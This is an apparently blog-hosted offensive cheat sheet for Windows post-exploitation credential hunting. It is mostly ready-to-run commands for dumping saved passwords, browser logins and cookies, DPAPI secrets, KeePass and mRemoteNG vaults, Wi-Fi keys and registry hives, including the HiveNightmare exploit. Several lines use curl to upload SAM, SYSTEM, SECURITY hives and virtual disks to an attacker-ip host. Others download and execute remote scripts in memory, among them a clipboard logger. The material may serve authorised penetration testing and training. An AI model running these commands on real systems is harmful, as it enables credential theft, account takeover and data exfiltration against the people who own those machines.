---
title: Pillaging :Windows  Credential Hunting & Extraction
date: 2026-06-26 13:01:53


categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Credential Hunting
  
tags:
  - Credential-Hunting
  - DPAPI
  - Registry
  - KeePass
  - mRemoteNG
  - SharpChrome
  - HiveNightmare
  - PowerShell-History
  - Windows-Vaults
  - Browser-Credentials
cover: /img/Windows-Credential-Hunting.png
top_img: /img/bg-img.jpg
description: A complete reference for hunting credentials on Windows, from registry keys and PowerShell history to LSASS dumps browser secrets
---





# Recursive Credential Search

> Search recursively for common credential-related keywords.

```cmd
cd C:\ & findstr /S /I /M /C:"password" /C:"passwd" /C:"pwd" /C:"secret" /C:"token" /C:"apikey" /C:"api_key" /C:"connectionstring" /C:"connection string" /C:"credential" *.txt *.ini *.config *.xml *.cfg *.conf *.json *.yaml *.yml *.ps1 *.bat
```

> ➜ Remove `/M` to display the matching lines instead of only the filenames.

```cmd
cd C:\ & findstr /S /I /N /P /C:"password" /C:"passwd" /C:"pwd" /C:"secret" /C:"token" /C:"apikey" /C:"api_key" /C:"connectionstring" /C:"connection string" /C:"credential" *.*
```

> Or via PowerShell

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.ini,*.config,*.xml,*.cfg,*.conf,*.json,*.yaml,*.yml,*.ps1,*.bat -File -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|pwd|secret|token|apikey|api_key|connectionstring|connection string|credential"
```


# Hunt for Credential Files

> ➜ Search recursively for files whose names or extensions suggest they may contain credentials or connection information.

```cmd
dir C:\ /S /B *pass* *password* *cred* *secret* *token* *.config *.conf *.ini *.xml *.json *.yaml *.yml *.rdp *.vnc *.kdbx 2>nul
```

> ➜ Alternatively, search for a specific file extension.

```cmd
where /R C:\ *.config
```

> Or via PowerShell

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.conf,*.ini,*.xml,*.json,*.yaml,*.yml,*.rdp,*.vnc,*.cred,*.kdbx -File -ErrorAction SilentlyContinue
```



# PowerShell History File

> Default path:

```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

> Confirm the path for the current user

```powershell
(Get-PSReadLineOption).HistorySavePath
```

> Read the current user's history

```powershell
gc (Get-PSReadLineOption).HistorySavePath
```

> Read every user's history at once

```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```



# Hunt for Unattend and Sysprep Files

> ➜ Search recursively for Windows unattended installation files that may contain embedded credentials.

```powershell
Get-ChildItem -Path C:\ -Recurse -Include Unattend.xml,Autounattend.xml,unattended.xml,sysprep.xml,sysprep.inf -ErrorAction SilentlyContinue
```

> Or

```cmd
dir /S /B C:\unattend.xml C:\autounattend.xml C:\Windows\Panther\*.xml C:\Windows\System32\Sysprep\*.xml 2>nul
```

> ➜ Inspect the credential section of any discovered file.

```cmd
C:\> type C:\Windows\Panther\Unattend.xml
```


# User / Computer Description Fields

> Read the description field of all local user accounts.

```
PS C:\> Get-LocalUser | Select-Object Name, Description
```

> Read the computer description field

```
PS C:\> Get-WmiObject -Class Win32_OperatingSystem | select Description
```



# The Registry

#### Windows AutoLogon

> ➜ Check whether Windows AutoLogon is configured and retrieve any stored username and password.

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Service ImagePath Credential Hunting

> ➜ Search service ImagePath values for common credential-related keywords.

```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | Get-ItemProperty -ErrorAction SilentlyContinue | Where-Object { $_.ImagePath -match "pass|pwd|password|user|username|cred|login|-u |-p " } | Select-Object -ExpandProperty ImagePath
```

> ➜ Display all service ImagePath values.

```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | Get-ItemProperty -ErrorAction SilentlyContinue | Select-Object ImagePath
```

#### PuTTY Saved Proxy Credentials

> Enumerate saved sessions (current user)

```PowerShell
PS C:\> reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
```

> Read a session and pull ProxyPassword

```PowerShell
PS C:\> reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\<session-name>"

# ProxyUsername  REG_SZ  administrator
# ProxyPassword  REG_SZ  1_4m_th3_@!
```

> ➜ If we have administrator privileges we can enumerate PuTTY sessions for all user profiles.

```
C:\> for /f "tokens=*" %a in ('reg query HKU') do @reg query "%a\SOFTWARE\SimonTatham\PuTTY\Sessions" 2>nul
```



# PowerShell DPAPI Credential Files

> PowerShell credentials exported with `Export-Clixml` are stored in XML files and encrypted with DPAPI.

> ➜ Find exported PowerShell credential files by content.

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.xml -File -ErrorAction SilentlyContinue | Select-String -Pattern "System.Management.Automation.PSCredential" | Select-Object Path -Unique
```

> ➜ Import the file.

```powershell
$credential = Import-Clixml -Path "C:\path\to\pass.xml"
```

> ➜ Read the username.

```powershell
$credential.GetNetworkCredential().UserName
```

> ➜ Read the password.

```powershell
$credential.GetNetworkCredential().Password
```

> Note: The password can usually be decrypted only by the same user on the same machine.



# Chrome Custom Dictionary

> Find it across every user profile

```
PS C:\> Get-ChildItem "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt" -ErrorAction SilentlyContinue
```

> Read and grep the matched file

```powershell
PS C:\> gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```



# Sticky Notes Database

> Sticky Notes is a built-in Windows application that lets users create quick notes on their desktop, users sometimes store passwords, credentials, or other sensitive information in these notes.

> Default path:

```text
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

> Find it across every user profile.

```powershell
Get-ChildItem "C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite" -ErrorAction SilentlyContinue
```

> ➜ Read the stored notes using PSSQLite (external module), we need import it first.

```powershell
Set-ExecutionPolicy Bypass -Scope Process

Import-Module .\PSSQLite.psd1
```

```powershell
Invoke-SqliteQuery -Database "C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite" -Query "SELECT Text FROM Note"
```

> ➜ Or transfer the Sticky Notes database to our machine and dump readable strings from the WAL file.

```bash
strings plum.sqlite-wal
```



# Saved Credentials & Vaults

### cmdkey Stored Credentials

> Windows can cache RDP/terminal-services credentials we can't read the plaintext, but we can reuse them.

##### List cached credentials for the current user

```
C:\> cmdkey /list
```

##### Run a command as that user with the saved credential

```
PS C:\> runas /savecred /user:<domain>\<user> "<command>"
```

### KeePass Database

> A `.kdbx` file is a KeePass vault, usually behind one master password.

> Locate any KeePass DB on the host or shares

```
PS C:\> Get-ChildItem -Path C:\ -Recurse -Include *.kdbx -ErrorAction SilentlyContinue
```

> Extract the hash Locally

```bash
keepass2john <database>.kdbx > keepass_hash
```

> Crack it offline

```
hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
```

### mRemoteNG Configuration

> `mRemoteNG` stores RDP/SSH/VNC credentials in `confCons.xml`, by default mRemoteNG encrypts credentials using a hardcoded master password : `mR3m` unless a custom one was set.

> Find confCons.xml for every user (generic)

```
PS C:\> Get-ChildItem "C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml" -ErrorAction SilentlyContinue
```

> If the user did not set a custom master password, we can easily decrypt all saved credentials using [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)

```bash
➜ python3 mremoteng_decrypt.py -s "Password_String"
```

> If a custom master password is used, we can attempt to brute-force it:

```bash
➜ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "Password_String" -p $password 2>/dev/null;done
```


# Browsers

### Chrome

##### Saved Logins

> We can decrypt and dump Chrome's saved logins (current user)

```
PS C:\> .\SharpChrome.exe logins /unprotect
```

##### Chromium Cookies

> Chrome stores cookies in an SQLite database encrypted with DPAPI. If you can decrypt them as the current user, you may be able to reuse authenticated web sessions.

> Default location

```text
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies
```

> Older location

```text
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies
```

> Load SharpChromium and dump all cookies

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')

Invoke-SharpChromium -Command "cookies"
```

> If the tool cannot find the cookie database, copy it from the new location and re-run.

```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

Invoke-SharpChromium -Command "cookies"
```

### Firefox Cookies

> Firefox stores cookies in an SQLite database (not protected by DPAPI). Each Firefox profile is stored in a randomly named folder.

> Locate the cookie database.

```powershell
Get-ChildItem "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" -ErrorAction SilentlyContinue
```

> Transfer the database to our machine and extract cookies using cookieextractor

```bash
python3 cookieextractor.py --dbpath "<path>/cookies.sqlite"
```



# Local Credential Stores (Memory & Hives)

#### FileZilla Server Admin Interface

> ➜ FileZilla Server exposes a local administration interface on TCP port 14147, if accessible it may reveal FTP credentials or allow administrative actions.

> Check whether the FileZilla Server administration interface is running locally.

```cmd
netstat -ano | findstr 14147
```

#### HiveNightmare / SeriousSam (CVE-2021-36934)

> HiveNightmare (SeriousSam) is a Windows vulnerability that allows low-privileged users to read the `SAM`, `SYSTEM`, and `SECURITY` registry hives from Volume Shadow Copies.

> Check if the machine is vulnerable.

```cmd
icacls C:\Windows\System32\config\SAM
```

> Dump the registry hives from the shadow copies using HiveNightmare

```powershell
.\HiveNightmare.exe
```

> Extract the password hashes from the dumped hives.

```bash
impacket-secretsdump -sam SAM-<date> -system SYSTEM-<date> -security SECURITY-<date> local
```

#### Wi-Fi Credentials

> With local admin on a host that has a Wi-Fi card.

> Enumerate all saved Wi-Fi profiles.

```cmd
netsh wlan show profiles
```

> Display the password for a specific Wi-Fi profile.

```cmd
netsh wlan show profile "<profile-name>" key=clear
```

> Dump the passwords for all saved Wi-Fi profiles.

```cmd
for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| findstr "All User Profile"') do @netsh wlan show profile name="%a" key=clear | findstr "SSID Key"
```



# Shares, Backups & Virtual Disks

### Virtual Disk Images (VHD / VHDX / VMDK)

> Backup software and virtualization platforms often store entire systems as virtual disk images. These images may contain registry hives, configuration files, databases, and other sensitive data.

> Locate virtual disk images.

```powershell
Get-ChildItem -Path C:\,D:\,E:\ -Recurse -Include *.vhd,*.vhdx,*.vmdk -File -ErrorAction SilentlyContinue
```

> Transfer the virtual disk to our machine.

```bash
➜ uploadserver
```

```powershell
curl.exe -F "files=@C:\Backups\Server01.vhdx" http://<attacker-ip>:8000/upload
```

> Mount the virtual disk on our linux machine.

```bash
guestmount -a <disk>.vmdk -i --ro /mnt/vmdk

guestmount --add <disk>.vhdx --ro /mnt/vhdx -m /dev/sda1
```

> Extract interesting files.

```text
Windows
--------
SAM
SYSTEM
SECURITY
web.config

Linux
-----
/etc/shadow
/etc/passwd
/etc/ssh/
```

> Dump password hashes.

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### Restic Backups

> Restic is a backup tool that can store backups of local or remote systems. If we compromise a backup server or recover the repository password, we may be able to restore files from multiple machines.

> With access to a Restic repository, we can:
> 
> - Enumerate available snapshots.
> - Browse backed-up files and folders.
> - Restore files from multiple systems.
> - Recover sensitive files such as registry hives, configuration files, SSH keys, and databases.

##### Recover the Repository Password

> During enumeration, search for backup scripts or configuration files containing the repository password.

```powershell
type C:\Scripts\backup.ps1
```

> Example output — the password is assigned to `$env:RESTIC_PASSWORD`:

```text
$env:RESTIC_PASSWORD="PASSWORD"
restic.exe -r <repository> backup <folder>
```

> The password may also appear in the PowerShell history.

```powershell
Select-String "RESTIC_PASSWORD|restic.exe" (Get-PSReadLineOption).HistorySavePath
```

> Example match:

```text
$env:RESTIC_PASSWORD="PASSWORD"
restic.exe -r <repository> backup <folder>
```

##### Locate Restic Repositories

```powershell
Get-ChildItem -Path C:\,D:\,E:\ -Recurse -Filter snapshots -Directory -ErrorAction SilentlyContinue
```

> Once the password is recovered, configure it for the current session.

```powershell
$env:RESTIC_PASSWORD="PASSWORD"
```

##### Enumerate Snapshots

```powershell
restic.exe -r <repository> snapshots

<ID>      <time>      <target_server>      <backed_up_folder>
```

##### Browse Snapshot Contents

```powershell
restic.exe -r <repository> ls <snapshot-id>
```

##### Restore a Snapshot

```powershell
restic.exe -r <repository> restore <snapshot-id> --target C:\Restore
```

> Example:

```text
PS C:\> tree C:\Restore

C:\RESTORE
└───C
    └───Windows
        └───System32
            └───config
                SAM
                SYSTEM
                SECURITY
```

##### Transfer Interesting Files

```bash
➜ uploadserver
```

```powershell
curl.exe -F "files=@C:\Restore\C\Windows\System32\config\SAM" http://<attacker-ip>:8000/upload

curl.exe -F "files=@C:\Restore\C\Windows\System32\config\SYSTEM" http://<attacker-ip>:8000/upload

curl.exe -F "files=@C:\Restore\C\Windows\System32\config\SECURITY" http://<attacker-ip>:8000/upload
```

##### Extract Password Hashes

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

Administrator:500:aad3b435b51404ee:<SNIP>:bac9dc5bc04b477f26:::
```


## Live Process Command-Line Monitoring

> Monitor running processes and display newly started processes with their command-line arguments, this can reveal credentials passed to scheduled tasks, services, or scripts at runtime.

> Monitor new process command lines (save the script as `procmon.ps1`).

```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

> Run the script in memory from our web server.

```powershell
IEX (iwr 'http://<our-ip>/procmon.ps1')
```


## Clipboard Monitoring

> The Windows clipboard may temporarily contain passwords, 2FA codes, RDP clipboard contents, or other sensitive information copied by users.

> Download and load Invoke-Clipboard

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
```

> Start monitoring clipboard activity.

```powershell
Invoke-ClipboardLogger
```